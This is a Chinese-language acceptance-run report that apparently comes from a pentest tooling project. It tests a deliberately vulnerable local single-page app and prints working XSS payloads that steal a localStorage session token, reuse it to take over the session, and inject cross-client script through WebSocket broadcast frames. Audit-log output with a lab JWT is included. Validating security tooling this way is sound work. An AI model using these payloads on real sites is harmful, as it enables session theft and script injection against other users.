# SPA 攻击验收实跑(T2-2b-4-6/7) — 2026-09-30

- 性质: **攻击验收实跑**(非单测) — 在 `spa-verify-acceptance.md`(验证验收, 执行级 DOM/帧证据)之上, 用**攻击载荷**证明 V2/V3 的**实际影响**: token 外带落审计 → 会话接管, 与跨客户端帧注入 → DOM 污染 → 外带。全部命令与输出为本文记录时的实跑原文。
- 靶场: `tests/golden-targets/spa/`(:8894; sink 实锚: app.js:175-177 `result.innerHTML` / app.js:203 `insertAdjacentHTML`; 服务端: spa-server.mjs:296 `/api/notes` 仅 GET+Bearer、:297 `/api/admin/stats` 无鉴权、:252-260 `/api/search?q=` 原样回显、:333-339 `/ws` 原样广播含发送者回显); 执行面: 常驻 `scripts/browser/cdp-proxy.mjs`(:8893, systemd `d2d-cdp-proxy.service`)。
- 外带证据通道(审计实证): cdp-proxy 对每个过 Fetch 闸的页面请求落 `<D2D_DATA_DIR>/evidence/cdp/audit.jsonl`(cdp-proxy.mjs:189-194, `{ts,event:'fetch-allow'|'fetch-deny',url}`, URL 截 200 字符) — XSS 语境持 token 发起的**token 化 URL**(`/api/search?q=<JWT>`)落审计 = 服务端视角外带证据; 更硬的自含链 = 同语境持 token `fetch /api/notes`(Bearer)断言返回 `sub=user`(会话接管, `evaluateAssertions` json_path 直判)。
- 本批红线: **V2/V3 必须实际影响级(外带/接管/跨客户端)** — V2 以 audit.jsonl 外带行 + `json_path=sub=user` 实证, V3 以页 B(另一客户端)注入节点 + 外带审计行实证, 均达成(§2.2/§2.3)。

## 0. 实跑方式

| 组件 | 起法 | 说明 |
|---|---|---|
| cdp-proxy | 常驻 8893(**主会话前置已启用**: `systemctl --user enable --now d2d-cdp-proxy.service`) | pid 2123412, `/health` 起步 `ready:false`(免鉴权, 只探测不拉起) → **首个业务调用懒拉起 chrome**(cdp-proxy.mjs:110-125): pid 2169080, CDP :9612(=9400+pid%400), per-eng profile `~/.d2d-data/cdp-profiles/default`, spawn 参数 `--proxy-server=http://127.0.0.1:8888 --disable-quic`(cdp-proxy.mjs:133-143) |
| SPA 靶场 | `bash scripts/ops/spa-start.sh start`(缺省数据根, 与常驻 cdp-proxy 同根) | pid 2168402, :8894, 就绪判据 `/api/notes=401` `/=200` 通过(spa-start.sh:46-50); 收官 `stop`(§4) |
| 审计基线 | `~/.d2d-data/evidence/cdp/audit.jsonl` | 起跑时**文件不存在(0 行)** → 收官 17 行(§2.4), 每行可归因本跑; **全局共享文件, 只按时间窗 grep, 零删除** |
| 鉴权 | `HT=$(cat ~/.config/d2d/worker-token)` | cdp-proxy host/worker token 二选一(cdp-proxy.mjs:37,221); 本文全部命令从文件读, **零凭据字面量** |

- **网络路径实测(如实记录)**: chromium 虽带 `--proxy-server=http://127.0.0.1:8888` 且不发 bypass 列表, 但 chromium 对回环目标有**隐式 bypass**(launch 未传 `<-loopback>` 反制, cdp-proxy.mjs:140-141) — `ss -tnp` 全程零 chromium→:8888 连接, egress 证据 `~/.d2d-data/evidence/proxy/proxy-1790758533333.jsonl`(76 行)**零 `8894` 行**。本跑实际治理闸 = **CDP Fetch gate**(audit.jsonl 逐请求落痕); egress 网关(MITM=1 active)在本跑中拦的是 chromium 自身后台 CONNECT(`deny accounts.google.com … CONNECT not in scope`)。回环流量是否要收进 egress 属 cdp-proxy 出网治理议题, **本批零触碰**(禁区文件), 留 upstream。
- audit 行内出现的 JWT 为**靶场临时凭据**: HS256 密钥在 spa 进程内随机生成(spa-server.mjs:206), `stop` 即废; 登录策略本就是 `user/任意密码` 放行(spa-server.mjs:228)。它是攻击链的**战利品证据**, 非 host/worker token — 本文不含任何真实凭据字面量。

## 1. 三行判定

| # | 漏洞 | 动作序列 | 断言结果 | 证据 | 判定 |
|---|---|---|---|---|---|
| V1 | `/api/admin/stats` 无鉴权 | (HTTP 面已证) `curl http://127.0.0.1:8894/api/admin/stats` 无 token | HTTP 200 + `warning:"V1 故意漏洞…"` 原文 | spa-recon-acceptance.md / spa-verify-acceptance.md §2.1(validator 通道 `verified:true, gate:'verified'`) | **confirmed(已覆盖)** — 本跑补探 200 一致, 攻击链标注已覆盖, 不重跑 |
| V2 | `#/search?q=` innerHTML DOM XSS | `/new #/login` → `/eval` 页内登录置 `localStorage.spa_token` → `/navigate #/search?q=<img src=x onerror=fetch('/api/search?q='+…spa_token…)>` → `/eval` 轮询 | poll#1 起 `#app img` 注入节点存在且稳定; audit 外带行 `/api/search?q=eyJhbGci…`(完整 JWT 落审计); 同语境持 token `fetch /api/notes` → `status=200, sub=user` | audit.jsonl:5-7(§2.2); `evaluateAssertions` 合取 HIT: `status=200 │ json_path=sub=user │ json_path=notes.0.title │ json_path=notes.2.body=…` | **confirmed(实际影响: JS 执行 + token 外带落审计 + 会话接管)** |
| V3 | `/ws` 广播 DOM XSS | 页 A `/new`、页 B `/new`(各自 connectWs 自连) → 页 A `/eval` `new WebSocket` 发攻击帧(帧 1 = `<img src=x onerror="fetch('/api/search?q=ws-'+document.title)">`, 帧 2 = `window.__wsx` 计数) → 攻击 socket 收 2 帧回显(含发送者) → 页 A/页 B `/eval` 轮询 | 攻击 socket `echoRecv:2`; 页 A 与页 B 均 `wsx:1` + `.ws-msg img`×2(跨客户端); 仍在线的 V2 页(第三客户端)同样 `wsx:1`( blast radius=**全部在线页面**); audit 外带行 `/api/search?q=ws-Golden%20SPA%20Target%20(D2D%204.5-0)`×3 | audit.jsonl:9-17(§2.3); 页 B `#ws-feed` innerHTML 全文(§2.3) | **confirmed(实际影响: 跨客户端帧注入 + DOM 污染 + 外带)** |

## 2. 逐项证据(实跑原文)

### 2.1 前置与基线

```console
$ systemctl --user is-active d2d-cdp-proxy.service d2d-egress.service   # 主会话前置启用, 本跑只验证
active
active
$ curl -s http://127.0.0.1:8893/health          # 起步态: ready:false — 首个业务调用才懒拉起 chrome
{"ok":true,"ready":false,"eng":"default","cdp":null,"scope":0,"profiles":"/home/kali/.d2d-data/cdp-profiles/default"}
$ bash scripts/ops/spa-start.sh start
[spa] 启动中 pid=2168402 port=8894 log=/home/kali/.d2d-data/run/spa-target.log ...
[spa] 已就绪: /api/notes=401(期望401) /=200(期望200)
[spa] pid=2168402 url=http://127.0.0.1:8894 故意漏洞: V1 /api/admin/stats(无鉴权) V2 /api/search?q= V3 /ws
$ curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8894/api/admin/stats   # V1 补探(无 token)
200
$ ls -la ~/.d2d-data/evidence/cdp/audit.jsonl    # 审计基线
audit.jsonl 尚不存在(基线=0 行)
```

### 2.2 V2 — DOM XSS 实际影响: 注入执行 → token 外带落审计 → 会话接管

**① 开页 + 页内登录**(经 cdp-proxy `/new` 首次业务调用懒拉起 chrome; 登录用页内 fetch 等价 app.js:71-88 表单路径, token 落 `localStorage.spa_token`):

```console
$ curl -s -X POST $PX/new -H "X-Auth: $HT" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:8894/#/login"}'
{"ok":true,"targetId":"379A6EDD81FFE8E840E16950D054CA34"}
$ curl -s $PX/health                              # chrome 已懒拉起
{"ok":true,"ready":true,"eng":"default","cdp":"http://127.0.0.1:9612","scope":0,"profiles":"/home/kali/.d2d-data/cdp-profiles/default"}
$ curl -s -X POST $PX/eval … -d '{"target":"379A6EDD…","expression":"(async()=>{const r=await fetch('"'"'/api/login'"'"',{method:'"'"'POST'"'"',…body:JSON.stringify({user:'"'"'user'"'"',password:'"'"'acceptance-run'"'"'})});const d=await r.json();localStorage.setItem('"'"'spa_token'"'"',d.token);return JSON.stringify({status:r.status,user:d.user,tokenStored:Boolean(localStorage.getItem('"'"'spa_token'"'"'))})})()"}'
{"ok":true,"value":"{\"status\":200,\"user\":\"user\",\"tokenStored\":true,\"tokenHead\":\"eyJhbGciOiJIUzI1\"}"}
```

**② 注入**(payload 即要求指定的形态, URL 编码后经 `/navigate` hash 路由; T0=2026-09-30T10:22:21Z 记录时间窗起点):

```console
$ curl -s -X POST $PX/navigate … -d '{"target":"379A6EDD…","url":"http://127.0.0.1:8894/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27/api/search?q=%27%2BencodeURIComponent(localStorage.spa_token%7C%7C%27no-token%27))%22%3E"}'
{"ok":true}
```

**③ 执行证据轮询**(注: 首轮 poll 因操作者 heredoc 引号笔误 4 次报 `bad json`, 修正后重跑 — 载荷注入在 `navigate` 时已发生, 证据不受影响):

```console
poll#1: {"ok":true,"value":"{\"img\":\"<img src=\\\"x\\\" onerror=\\\"fetch('/api/search?q='+encodeURIComponent(localStorage.spa_token||'no-token'))\\\">\",\"imgs\":1,\"hash\":\"#/search?q=<img src=x onerror=\\\"fetch('/api/search?q='+encodeURIComponent(localStorage.spa_token||'no-token'))\\\">\"}"}
poll#2-4: 恒定同上                              ← 注入节点稳定存在(app.js:175 innerHTML sink 实弹)
```

**④ 外带证据 — audit.jsonl 时间窗 grep 命令与命中行原文**(token 化 URL 落审计 = 服务端视角外带; 三行依次是: 载体请求本身 / img `src=x` 子资源 / **外带行**):

```console
$ awk 'index($0,"\"event\":\"fetch-allow\"") && substr($0,8,19) >= "2026-09-30T10:22:21"' \
    ~/.d2d-data/evidence/cdp/audit.jsonl
{"ts":"2026-09-30T10:22:21.415Z","event":"fetch-allow","url":"http://127.0.0.1:8894/api/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27%2Fapi%2Fsearch%3Fq%3D%27%2BencodeURIComponent(localStorage.spa_token%7C%7C%27no-token%27))%22%3E"}
{"ts":"2026-09-30T10:22:21.529Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:22:21.610Z","event":"fetch-allow","url":"http://127.0.0.1:8894/api/search?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTA3NjM3MTQsImV4cCI6MTc5MDc2NzMxNH0.CYM9PRwGKC4ZRCplYfJI34s66aFBzE3BxCfkXD4OLl8"}
```

- 外带行 URL 总长 187 字符 < cdp-proxy 的 200 截断(cdp-proxy.mjs:192 `url.slice(0,200)`) → **完整 JWT** 原文落审计。JWT 即 `sub=user` 的会话凭据本体(spa-server.mjs:53-58) — XSS 语境读到什么, 外带就带走什么。
- `/x` 行是 `img src=x` 的子资源请求 — onerror 触发链的旁证(加载失败 → 执行 onerror → 发起外带 fetch)。

**⑤ 会话接管 — 同语境持 token `fetch /api/notes`(Bearer) + `evaluateAssertions` json_path 直判**:

```console
$ curl -s -X POST $PX/eval … -d '{"target":"379A6EDD…","expression":"(async()=>{const t=localStorage.getItem('"'"'spa_token'"'"');const r=await fetch('"'"'/api/notes'"'"',{headers:{Authorization:'"'"'Bearer '"'"'+t}});return JSON.stringify({status:r.status, body:await r.text()})})()"}'
{"ok":true,"value":"{\"status\":200,\"body\":\"{\\\"notes\\\":[{\\\"id\\\":1,\\\"title\\\":\\\"演练纪律\\\",…},{\\\"id\\\":2,…},{\\\"id\\\":3,\\\"title\\\":\\\"V2/V3 提示\\\",\\\"body\\\":\\\"HTTP 工具面探测不到的两个洞, 在浏览器环里。\\\"}],\\\"sub\\\":\\\"user\\\"}\"}"}
```

```console
$ node --input-type=module -e '        # validator.js 只 import 零触碰(cdp-client.mjs 同款先例)
    const { parseAssertions, evaluateAssertions } = await import("file:///home/kali/d2d/plugin/pentest-dsh/validator.js");
    const asserts = [{type:"status",value:200},{type:"json_path",path:"sub",value:"user"},
                     {type:"json_path",path:"notes.0.title"},
                     {type:"json_path",path:"notes.2.body",value:"HTTP 工具面探测不到的两个洞, 在浏览器环里。"}];
    const ev = evaluateAssertions({ body }, parseAssertions(asserts), { channel:"cdp", navStatus:200 });
    console.log(JSON.stringify(ev, null, 2));'   # body = 上一步 /api/notes 响应原文(217B)
{
  "hit": true,
  "firstHit": { "type": "status", "value": 200 },
  "dslMode": true,
  "hits": [ "status=200", "json_path=sub=user", "json_path=notes.0.title",
            "json_path=notes.2.body=HTTP 工具面探测不到的两个洞, 在浏览器环里。" ],
  "misses": []
}
```

- 判定材料: `sub=user` 是 `/api/notes` 从 **Bearer JWT** 里验签回填的身份(spa-server.mjs:235-239) — XSS 语境里的攻击者 JS 用偷来的 token 完整复现了合法会话, 四项合取 HIT(docs/assertion-dsl.md §①: DSL 对象形态 = 合取主张)。外带(audit 行)+ 接管(json_path HIT)合起来 = **实际影响**, 不止 verify-acceptance 的"JS 执行 + DOM"。

### 2.3 V3 — 跨客户端帧注入实际影响: 发帧 → 他人页面 DOM 污染 → 外带

**① 两页在线**(各自 `connectWs()`(app.js:185-214)自连; 页 B 探活: `#ws-feed` = `[sys] 已连接 /ws(广播消息 innerHTML 渲染 — V3)`):

```console
$ curl -s -X POST $PX/new … -d '{"url":"http://127.0.0.1:8894/#/login"}'   # 页 A(发帧方+受害方)
{"ok":true,"targetId":"63C5A87C2BC794AF713763B121584E5A"}
$ curl -s -X POST $PX/new … -d '{"url":"http://127.0.0.1:8894/#/login"}'   # 页 B(纯受害方)
{"ok":true,"targetId":"81EC9B55D9FD261F75027DC4C7244987"}
```

**② 页 A /eval 发帧**(纯 cdp 化: 攻击 socket 由页内 JS 创建, 无外部 WS 客户端; 帧 1 = 指定外带载荷, 帧 2 = `window.__wsx` 执行计数 — 双帧都过服务端原样广播 spa-server.mjs:333-339):

```console
$ awk '…' 之外的发帧命令(节选): /eval expression =
new Promise((res)=>{const ws=new WebSocket('ws://127.0.0.1:8894/ws');window.__atk=ws;window.__atkRecv=[];
  ws.onopen=()=>{ws.send(`<img src=x onerror="fetch('/api/search?q=ws-'+document.title)">`);
                 setTimeout(()=>ws.send(`<img src=x onerror="window.__wsx=(window.__wsx||0)+1">`),300)};
  ws.onmessage=(ev)=>window.__atkRecv.push(String(ev.data).slice(0,160)); …})
→ {"ok":true,"value":"{\"open\":true,\"sent\":2,\"echoRecv\":2,\"echo\":[\"<img src=x onerror=\\\"fetch('/api/search?q=ws-'+document.title)\\\">\",\"<img src=x onerror=\\\"window.__wsx=(window.__wsx||0)+1\\\">\"]}"}
```

- `echoRecv:2` = 发送者回显逐帧原样返回(spa-server.mjs:338) — 帧内容未被服务端改写, 广播的是原攻击帧。

**③ 三件套断言(页 A = 收广播+回显, 页 B = 跨客户端纯受害方; poll#1 即命中)**:

```console
页 A(63C5A87C…): {"wsx":1,"msgs":3,"imgs":["<img src=\"x\" onerror=\"fetch('/api/search?q=ws-'+document.title)\">","<img src=\"x\" onerror=\"window.__wsx=(window.__wsx||0)+1\">"],"atkEcho":2}
页 B(81EC9B55…): {"wsx":1,"msgs":3,"imgs":[…同上两节点…],"title":"Golden SPA Target (D2D 4.5-0)"}
V2 页(379A6EDD…, 仍在线的第三客户端): {"wsx":1,"msgs":3,"imgs":2}   ← blast radius = 全部在线页面
```

页 B `#ws-feed` innerHTML 全文(DOM 污染证据, sys 行外两节点均为帧注入):

```html
<div class="ws-msg sys">[sys] 已连接 /ws(广播消息 innerHTML 渲染 — V3)</div>
<div class="ws-msg"><img src="x" onerror="fetch('/api/search?q=ws-'+document.title)"></div>
<div class="ws-msg"><img src="x" onerror="window.__wsx=(window.__wsx||0)+1"></div>
```

**④ 外带证据 — V3 时间窗(T0=2026-09-30T10:25:49Z)grep 与命中行原文**(3 页渲染帧 1 → 3 条 `/x` → 3 条外带; 帧 2 → 3 条 `/x`):

```console
$ awk 'index($0,"\"event\":\"fetch-allow\"") && substr($0,8,19) >= "2026-09-30T10:25:49"' \
    ~/.d2d-data/evidence/cdp/audit.jsonl
{"ts":"2026-09-30T10:25:50.060Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:25:50.071Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:25:50.081Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:25:50.135Z","event":"fetch-allow","url":"http://127.0.0.1:8894/api/search?q=ws-Golden%20SPA%20Target%20(D2D%204.5-0)"}
{"ts":"2026-09-30T10:25:50.162Z","event":"fetch-allow","url":"http://127.0.0.1:8894/api/search?q=ws-Golden%20SPA%20Target%20(D2D%204.5-0)"}
{"ts":"2026-09-30T10:25:50.167Z","event":"fetch-allow","url":"http://127.0.0.1:8894/api/search?q=ws-Golden%20SPA%20Target%20(D2D%204.5-0)"}
{"ts":"2026-09-30T10:25:50.337Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:25:50.344Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
{"ts":"2026-09-30T10:25:50.349Z","event":"fetch-allow","url":"http://127.0.0.1:8894/x"}
$ grep 'fetch-allow' ~/.d2d-data/evidence/cdp/audit.jsonl | grep -cF '/api/search?q=ws-'
3
```

- 外带 URL 携带 `document.title`(`Golden SPA Target (D2D 4.5-0)`, fetch 自动百分号编码) — 攻击者把受害页内信息编码进 URL 交由代理/服务端审计可见, 与 V2 同一外带通道。
- **边界复核(与 verify-acceptance §2.3 一致)**: `grep -c 'ws://' audit.jsonl` = 0 — 页内 `ws://` 握手照常连上(Fetch.enable 未对 WebSocket 握手发 requestPaused, chromium 150 实测), WS 面不落本审计; 本跑外带全部走 http(s) fetch 面。该闸边界属 cdp-proxy 安全议题, 禁区零触碰, 留 upstream。

### 2.4 audit.jsonl 全量归因(共享文件纪律: 只 grep, 零删除)

| 行 | ts | 内容 | 归因 |
|---|---|---|---|
| 1-3 | 10:21:38-40 | style.css / app.js / favicon.ico | V2 页加载子资源(主文档请求先于 Fetch 闸 attach, 未落痕 — 闸从会话 attach 起生效) |
| 4 | 10:21:54 | /api/login | V2 页内登录 fetch(§2.2①) |
| 5 | 10:22:21.415 | /api/search?q=<payload> | V2 载体请求(app.js:170, q 原样回显) |
| 6 | 10:22:21.529 | /x | V2 `img src=x` |
| 7 | 10:22:21.610 | /api/search?q=eyJhbGci… | **V2 外带行(token 化 URL)** |
| 8 | 10:24:21 | /api/notes | V2 会话接管 fetch(§2.2⑤, Bearer 头不入审计, 落痕证行为) |
| 9-11 | 10:25:50.060-.081 | /x ×3 | V3 帧 1 img ×3 页(V2 页/A/B) |
| 12-14 | 10:25:50.135-.167 | /api/search?q=ws-… | **V3 外带行 ×3(逐受害页一条)** |
| 15-17 | 10:25:50.337-.349 | /x ×3 | V3 帧 2 img ×3 页 |

合计 17 行 = 7(V2 窗) + 1(接管) + 9(V3 窗), 无一行不可归因; 文件收官原样保留(`wc -l` = 17), 供他跑/审阅复读。

## 3. 与 4.5-3 / 前序验收的衔接

- 判定升级链: spa-recon(HTTP 面) → spa-verify(执行级: `window.__xss===42` / `.ws-msg` 节点) → **本跑(实际影响: 外带落审计 + 会话接管 + 跨客户端注入)**。三跑的判定列逐级加码, 4.5-3 的"三行判定形态"(动作序列/断言结果/证据/判定)保持不变。
- 断言语汇复用: 本跑判定走 validator 的 `evaluateAssertions`(`json_path` 型, validator.js:724-733)直判 — 与 docs/assertion-dsl.md §① 同一权威, 攻击档不做新 DSL。
- 审批面注记: 本跑全部经 `/navigate`+`/eval` 组合(读型页内 fetch), 未触发 approvals.mjs 的 browser-state-change 机检词表(`/fill|/click|/clickAt`+提交语义三重合取); 若 worker 用 `/fill`+`/click` 提交表单实现同链, 该 bash 命令会落 `kind:'ask'` 审批单(恒 high 人工, 见 docs/browser-attack-runbook.md §②)。

## 4. 清理(实跑)

```console
$ bash scripts/ops/spa-start.sh stop          # TERM → [spa] 已停止(pid 2168402)
$ curl -s -X POST $PX/close …                  # 三页逐个 /close → {"ok":true} ×3
$ ss -tln | grep ':8894'                       # (空) — 端口释放
$ ps -eo args | grep 'spa-server.mjs' | grep -v grep   # (空)
$ systemctl --user is-active d2d-cdp-proxy d2d-egress d2d-spa d2d-graphd d2d-dsh-web
active active active active active             # 常驻栈全程未重启未改; 池 chrome(:9612)归 systemd 单元管, 按设计保温
$ wc -l < ~/.d2d-data/evidence/cdp/audit.jsonl
17                                             # 共享审计文件零删除原样保留
```

JWT 事后状态: spa 进程已 `stop`, HS256 密钥随之消失 — §2.2 外带行里的 token 为**死凭据**, 仅作证据原文。
